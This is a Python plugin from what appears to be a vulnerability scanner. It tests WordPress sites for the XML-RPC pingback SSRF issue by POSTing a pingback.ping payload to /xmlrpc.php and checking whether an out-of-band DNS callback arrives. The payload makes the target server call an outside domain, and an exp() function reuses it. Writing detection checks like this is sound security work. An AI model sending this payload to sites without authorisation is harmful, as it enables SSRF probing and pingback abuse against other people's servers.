import requests
from plugins.oob import verify_request, gen_oob_domain



# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Wordpress XMLRPC Pingback detection''',
        "description": '''''',
        "severity": "info",
        "references": [
            "https://github.com/dorkerdevil/rpckiller", 
            "https://the-bilal-rizwan.medium.com/wordpress-xmlrpc-php-common-vulnerabilites-how-to-exploit-them-d8d3c8600b32"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["wordpress", "ssrf", "oast", "xmlrpc"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        oob_domain,flag = gen_oob_domain()

        path = """/xmlrpc.php"""
        method = "POST"
        data = """<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param>
      <value>
        <string>http://{oob_domain}</string>
      </value>
    </param>
    <param>
      <value>
        <string>{BaseURL}/?p=1</string>
      </value>
    </param>
  </params>
</methodCall>""".format(oob_domain=oob_domain, BaseURL=url)
        headers = {}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if verify_request(type="dns", flag=flag):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url